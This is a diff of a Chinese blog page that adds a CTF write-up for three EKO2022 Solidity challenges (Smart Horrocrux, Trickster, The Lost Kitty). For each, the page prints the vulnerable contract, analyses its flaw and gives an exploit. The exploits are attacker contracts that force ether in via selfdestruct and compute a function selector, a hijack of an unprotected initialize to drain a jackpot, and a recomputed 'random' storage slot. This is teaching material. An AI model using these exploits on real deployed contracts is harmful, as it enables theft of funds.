@@ -22,18 +22,31 @@
     var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="知而不行，谓之不诚">
+  <meta name="description" content="全新的CTF系列—–EKO，这应该是ethernaut组织开发出的CTF竞赛">
 <meta property="og:type" content="article">
 <meta property="og:title" content="EKO-CTF(二)">
 <meta property="og:url" content="http://example.com/2023/03/19/EKO-CTF-%E4%BA%8C/index.html">
 <meta property="og:site_name" content="lucifer&#39;s blog">
-<meta property="og:description" content="知而不行，谓之不诚">
+<meta property="og:description" content="全新的CTF系列—–EKO，这应该是ethernaut组织开发出的CTF竞赛">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2023/03/19/EKO-CTF-%E4%BA%8C/image-20230320192905783.png">
+<meta property="og:image" content="http://example.com/2023/03/19/EKO-CTF-%E4%BA%8C/image-20230320193104191.png">
+<meta property="og:image" content="http://example.com/2023/03/19/EKO-CTF-%E4%BA%8C/image-20230320193318149.png">
+<meta property="og:image" content="http://example.com/2023/03/19/EKO-CTF-%E4%BA%8C/image-20230320193547528.png">
+<meta property="og:image" content="http://example.com/2023/03/19/EKO-CTF-%E4%BA%8C/image-20230320201012962.png">
+<meta property="og:image" content="http://example.com/2023/03/19/EKO-CTF-%E4%BA%8C/image-20230320201056413.png">
+<meta property="og:image" content="http://example.com/2023/03/19/EKO-CTF-%E4%BA%8C/image-20230320201133842.png">
+<meta property="og:image" content="http://example.com/2023/03/19/EKO-CTF-%E4%BA%8C/image-20230320201234781.png">
+<meta property="og:image" content="http://example.com/2023/03/19/EKO-CTF-%E4%BA%8C/image-20230320201413321.png">
+<meta property="og:image" content="http://example.com/2023/03/19/EKO-CTF-%E4%BA%8C/image-20230320201404832.png">
+<meta property="og:image" content="http://example.com/2023/03/19/EKO-CTF-%E4%BA%8C/image-20230320201354663.png">
+<meta property="og:image" content="http://example.com/2023/03/19/EKO-CTF-%E4%BA%8C/image-20230320201448809.png">
 <meta property="article:published_time" content="2023-03-19T12:40:06.000Z">
-<meta property="article:modified_time" content="2023-03-19T12:40:46.684Z">
+<meta property="article:modified_time" content="2023-03-20T12:25:02.565Z">
 <meta property="article:author" content="lucifer">
 <meta property="article:tag" content="CTF">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2023/03/19/EKO-CTF-%E4%BA%8C/image-20230320192905783.png">
 
 <link rel="canonical" href="http://example.com/2023/03/19/EKO-CTF-%E4%BA%8C/">
 
@@ -200,10 +213,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2023-03-19 20:40:06 / 修改时间：20:40:46" itemprop="dateCreated datePublished" datetime="2023-03-19T20:40:06+08:00">2023-03-19</time>
+              <time title="创建时间：2023-03-19 20:40:06" itemprop="dateCreated datePublished" datetime="2023-03-19T20:40:06+08:00">2023-03-19</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-03-20 20:25:02" itemprop="dateModified" datetime="2023-03-20T20:25:02+08:00">2023-03-20</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -220,14 +239,14 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>0</span>
+              <span>7.1k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>1 分钟</span>
+              <span>6 分钟</span>
             </span>
 
         </div>
@@ -239,7 +258,68 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        
+        <p>全新的CTF系列—–<a target="_blank" rel="noopener" href="https://www.ctfprotocol.com/tracks/eko2022">EKO</a>，这应该是ethernaut组织开发出的CTF竞赛</p>
+ <span id="more"></span>
+
+<h1 id="Smart-Horrocrux"><a href="#Smart-Horrocrux" class="headerlink" title="Smart Horrocrux"></a>Smart Horrocrux</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>题目合约：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity 0.8.17;</span><br><span class="line"></span><br><span class="line">/// @title SmartHorrocrux</span><br><span class="line">/// @author https://twitter.com/AugustitoQ</span><br><span class="line">/// @notice Some security researchers have recently found an eighth Horrocrux, it seems that Voldemort has link to a smart contract, can you destroy it?</span><br><span class="line">/// @custom:url https://www.ctfprotocol.com/tracks/eko2022/smart-horrocrux</span><br><span class="line">contract SmartHorrocrux &#123;</span><br><span class="line">    bool private invincible;</span><br><span class="line">    bytes32 private constant _spell = 0x45746865724b6164616272610000000000000000000000000000000000000000;</span><br><span class="line">    // var only for test purposes</span><br><span class="line">    bool public alive = true;</span><br><span class="line"></span><br><span class="line">    constructor() payable &#123;</span><br><span class="line">        require(msg.value == 2, &quot;Pay Horrorcrux creation price&quot;);</span><br><span class="line">        setInvincible();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function destroyIt(string memory spell, uint256 magic) public &#123;</span><br><span class="line">        bytes32 spellInBytes;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            spellInBytes := mload(add(spell, 32))</span><br><span class="line">        &#125;</span><br><span class="line">        require(spellInBytes == _spell, &quot;That spell wouldn&#x27;t kill a fly&quot;);</span><br><span class="line">        require(!invincible, &quot;The Horrocrux is still invincible&quot;);</span><br><span class="line"></span><br><span class="line">        bytes memory kedavra = abi.encodePacked(bytes4(bytes32(uint256(spellInBytes) - magic)));</span><br><span class="line">        address(this).call(kedavra);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function kill() external &#123;</span><br><span class="line">        require(msg.sender == address(this), &quot;No one can kill me&quot;);</span><br><span class="line">        alive = false;</span><br><span class="line">        selfdestruct(payable(tx.origin));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setInvincible() public &#123;</span><br><span class="line">        invincible = (address(this).balance == 1) ? false : true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fallback() external &#123;</span><br><span class="line">        uint256 b = address(this).balance;</span><br><span class="line">        invincible = true;</span><br><span class="line">        if (b &gt; 0) &#123;</span><br><span class="line">            tx.origin.call&#123;value: b&#125;(&quot;&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Some security researchers have recently found an eighth Horrocrux, it seems that Voldemort has link to a smart contract, can you destroy it?</p>
+</blockquote>
+<p>意思就是要我们摧毁这个合约。</p>
+<p>既然要摧毁这个合约，那肯定与自毁脱不了干系。合约中存在一个external的kill函数，其中就有自毁语句，那我们的目的肯定是调用到这个自毁语句了，而他限制了调用者必须是本合约，那么向上看能看到destroyIt函数中就有本合约的call调用，思路清晰，调用destroyIt函数。</p>
+<p><img src="/2023/03/19/EKO-CTF-%E4%BA%8C/image-20230320192905783.png" alt="image-20230320192905783"></p>
+<p>参数包括一个string类型和一个uint256类型，第一个限制要求我们的string参数的值转成bytes32后与spellInBytes相等，由于合约中已经给出了spellInBytes，我们稍加计算即可。</p>
+<p>第二个限制要求invincible为false,而在合约创建时由于传入的value为2，所以初始的invincible为true。</p>
+<p><img src="/2023/03/19/EKO-CTF-%E4%BA%8C/image-20230320193104191.png" alt="image-20230320193104191"></p>
+<p>而要让invincible变成false就需要合约的余额为1，而fallback函数能够很轻松的让我们把合约中的所有余额给拿出来，看似合约没有payable函数，那我们就需要使用自毁向其传入1 wei即可。</p>
+<p>两个限制绕开之后，就来到最后call调用的步骤。</p>
+<p><img src="/2023/03/19/EKO-CTF-%E4%BA%8C/image-20230320193318149.png" alt="image-20230320193318149"></p>
+<p>函数选择器的计算为将spellInBytes与我们传入的magic进行减法，最后转成bytes4，也很简单，计算即可，分析完成开始攻击。</p>
+<h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h2><p>攻击合约：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">contract attck&#123;</span><br><span class="line">    SmartHorrocrux smart;</span><br><span class="line">    constructor(address _smart)&#123;</span><br><span class="line">        smart = SmartHorrocrux(_smart);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function init()public payable&#123;</span><br><span class="line">        address(smart).call(&quot;&quot;);</span><br><span class="line">        self se = new self&#123;value:1&#125;(address(smart));</span><br><span class="line">        smart.setInvincible();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function att()public&#123;</span><br><span class="line">        smart.destroyIt(tes(),figure());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function tes()public pure returns(string memory)&#123;</span><br><span class="line">        bytes memory str = hex&quot;45746865724b6164616272610000000000000000000000000000000000000000&quot;;</span><br><span class="line">        return string(str);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function figure()public pure returns(uint256)&#123;</span><br><span class="line">        return uint256(0x4574686500000000000000000000000000000000000000000000000000000000)-</span><br><span class="line">        uint256(0x41c0e1b500000000000000000000000000000000000000000000000000000000);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract self&#123;</span><br><span class="line">    constructor(address addr)payable&#123;</span><br><span class="line">        require(msg.value==1);</span><br><span class="line">        selfdestruct(payable(addr));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>攻击步骤即传入1wei调用init函数，然后调用att函数即可。</p>
+<p>记得在调用att函数时将gas设置的高一点，由于合约中存在call调用的关系，容易发生gas不足call调用失败</p>
+<p><img src="/2023/03/19/EKO-CTF-%E4%BA%8C/image-20230320193547528.png" alt="image-20230320193547528"></p>
+<h1 id="Trickster"><a href="#Trickster" class="headerlink" title="Trickster"></a>Trickster</h1><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>题目合约：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity 0.8.17;</span><br><span class="line"></span><br><span class="line">/// @title Trickster</span><br><span class="line">/// @author https://twitter.com/mattaereal</span><br><span class="line">/// @notice We might have spotted a honeypot... Anon, can you manage to obtain the real jackpot?</span><br><span class="line">/// @custom:url https://www.ctfprotocol.com/tracks/eko2022/trickster</span><br><span class="line">contract Jackpot &#123;</span><br><span class="line">    address private jackpotProxy;</span><br><span class="line">    address private owner;</span><br><span class="line"></span><br><span class="line">    modifier onlyOwner() &#123;</span><br><span class="line">        require(msg.sender == owner);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function initialize(address _jackpotProxy) public payable &#123;</span><br><span class="line">        jackpotProxy = _jackpotProxy;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyJackpotProxy() &#123;</span><br><span class="line">        require(msg.sender == jackpotProxy);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function claimPrize(uint256 amount) external payable onlyJackpotProxy &#123;</span><br><span class="line">        payable(msg.sender).transfer(amount * 2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fallback() external payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract JackpotProxy &#123;</span><br><span class="line">    address private owner;</span><br><span class="line">    address private jackpot;</span><br><span class="line"></span><br><span class="line">    modifier onlyOwner() &#123;</span><br><span class="line">        require(msg.sender == owner);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    constructor() payable &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">        address _proxy = address(new Jackpot());</span><br><span class="line">        initialize(_proxy);</span><br><span class="line">        payable(_proxy).transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function initialize(address _jackpot) public onlyOwner &#123;</span><br><span class="line">        jackpot = _jackpot;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function claimPrize() external payable &#123;</span><br><span class="line">        require(msg.value &gt; 0, &quot;zero deposit&quot;);</span><br><span class="line">        (bool success,) = jackpot.call&#123;value: msg.value&#125;(abi.encodeWithSignature(&quot;claimPrize(uint)&quot;, msg.value));</span><br><span class="line">        require(success, &quot;failed&quot;);</span><br><span class="line">        payable(msg.sender).transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function balance() external view returns (uint256) &#123;</span><br><span class="line">        return jackpot.balance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>题目描述：</p>
+<blockquote>
+<p>We might have spotted a honeypot… Can you manage to obtain the real jackpot?.<br>Hacking casino slot machines is considered illegal.</p>
+</blockquote>
+<p>大意是我们需要获得头奖。</p>
+<p>描述说的模糊不清，我们就可以去工厂合约中查询通关条件</p>
+<p><img src="/2023/03/19/EKO-CTF-%E4%BA%8C/image-20230320201012962.png" alt="image-20230320201012962"></p>
+<p>注意这里是JackpotProxy中的balance函数而不是该合约的balance</p>
+<p><img src="/2023/03/19/EKO-CTF-%E4%BA%8C/image-20230320201056413.png" alt="image-20230320201056413"></p>
+<p>目的很简单了，把存入jackpot的钱都取出来。</p>
+<p><img src="/2023/03/19/EKO-CTF-%E4%BA%8C/image-20230320201133842.png" alt="image-20230320201133842"></p>
+<p>很快发现合约本身就提供取钱的函数，虽然有关于调用者的限制，但上面就有一个没有任何限制条件的改变jackpotProxy的函数，那思路就很清晰了。</p>
+<p><img src="/2023/03/19/EKO-CTF-%E4%BA%8C/image-20230320201234781.png" alt="image-20230320201234781"></p>
+<p>通过两种方式都可以查出jackpot的地址，we3.js和区块链浏览器，我这里选择了web3.js。查出之后改变jackpotProxy然后输入余额的一半直接调用函数即可。</p>
+<h2 id="攻击-1"><a href="#攻击-1" class="headerlink" title="攻击"></a>攻击</h2><p>无攻击合约，直接攻击。</p>
+<p><img src="/2023/03/19/EKO-CTF-%E4%BA%8C/image-20230320201413321.png" alt="image-20230320201413321"></p>
+<p><img src="/2023/03/19/EKO-CTF-%E4%BA%8C/image-20230320201404832.png" alt="image-20230320201404832"></p>
+<p><img src="/2023/03/19/EKO-CTF-%E4%BA%8C/image-20230320201354663.png" alt="image-20230320201354663"></p>
+<p>查出地址后，将jackpotProxy改成我们自己，然后调用claimPrize输入50000000000000即可。</p>
+<p><img src="/2023/03/19/EKO-CTF-%E4%BA%8C/image-20230320201448809.png" alt="image-20230320201448809"></p>
+<h1 id="The-Lost-Kitty"><a href="#The-Lost-Kitty" class="headerlink" title="The Lost Kitty"></a>The Lost Kitty</h1><h2 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h2><p>题目合约：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">/// @title The Lost Kitty</span><br><span class="line">/// @author https://twitter.com/Cryptonicle1</span><br><span class="line">/// @notice Lucas is a scientist who has lost his cat in a big house that has 2^256 rooms, anon can you find it?</span><br><span class="line">/// @custom:url https://www.ctfprotocol.com/tracks/eko2022/hidden-kittycat</span><br><span class="line">contract HiddenKittyCat &#123;</span><br><span class="line">    address private immutable _owner;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        _owner = msg.sender;</span><br><span class="line">        bytes32 slot = keccak256(abi.encodePacked(block.timestamp, blockhash(block.number - 69)));</span><br><span class="line"></span><br><span class="line">        assembly &#123;</span><br><span class="line">            sstore(slot, &quot;KittyCat!&quot;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function areYouHidingHere(bytes32 slot) external view returns (bool) &#123;</span><br><span class="line">        require(msg.sender == _owner, &quot;!owner&quot;);</span><br><span class="line">        bytes32 kittyPointer;</span><br><span class="line"></span><br><span class="line">        assembly &#123;</span><br><span class="line">            kittyPointer := sload(slot)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return kittyPointer == &quot;KittyCat!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function destroyMe() external &#123;</span><br><span class="line">        require(msg.sender == _owner, &quot;!owner&quot;);</span><br><span class="line">        selfdestruct(payable(address(0)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract House &#123;</span><br><span class="line">    bool public catFound;</span><br><span class="line"></span><br><span class="line">    function isKittyCatHere(bytes32 _slot) external &#123;</span><br><span class="line">        if (catFound) &#123;</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">        HiddenKittyCat hiddenKittyCat = new HiddenKittyCat();</span><br><span class="line">        bool found = hiddenKittyCat.areYouHidingHere(_slot);</span><br><span class="line"></span><br><span class="line">        if (!found) &#123;</span><br><span class="line">            hiddenKittyCat.destroyMe();</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            catFound = true;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>题目描述：</p>
+<blockquote>
+<p>Lucas is a scientist who lives with his cat in a big house that has 2^256 rooms. His cat likes to play hide and seek and jumps to a random room whenever it hears a door opening in another one. Can you find Lucas’ cat? Set the variable <code>catFound</code> to <code>true</code> to win this challenge.</p>
+</blockquote>
+<p>要求已经给出来了，将catFound变量设置为true.</p>
+<p>看合约很明显是一个关于随机数的题，只要在攻击合约中按同样的方式算出slot即可，不过多赘述了。</p>
+<h2 id="攻击-2"><a href="#攻击-2" class="headerlink" title="攻击"></a>攻击</h2><p>攻击合约：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">contract attack&#123;</span><br><span class="line">    House ho;</span><br><span class="line">    constructor(address _ho)&#123;</span><br><span class="line">        ho = House(_ho);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function att()public&#123;</span><br><span class="line">        bytes32 slot = keccak256(abi.encodePacked(block.timestamp, blockhash(block.number - 69)));</span><br><span class="line">        ho.isKittyCatHere(slot);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>直接调用即可</p>
+
     </div>
 
     
@@ -336,6 +416,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Smart-Horrocrux"><span class="nav-number">1.</span> <span class="nav-text">Smart Horrocrux</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%86%E6%9E%90"><span class="nav-number">1.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E5%87%BB"><span class="nav-number">1.2.</span> <span class="nav-text">攻击</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Trickster"><span class="nav-number">2.</span> <span class="nav-text">Trickster</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%86%E6%9E%90-1"><span class="nav-number">2.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E5%87%BB-1"><span class="nav-number">2.2.</span> <span class="nav-text">攻击</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#The-Lost-Kitty"><span class="nav-number">3.</span> <span class="nav-text">The Lost Kitty</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%86%E6%9E%90-2"><span class="nav-number">3.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E5%87%BB-2"><span class="nav-number">3.2.</span> <span class="nav-text">攻击</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -398,12 +479,12 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="站点总字数">238k</span>
+    <span title="站点总字数">245k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">3:37</span>
+    <span title="站点阅读时长">3:43</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
   </div>
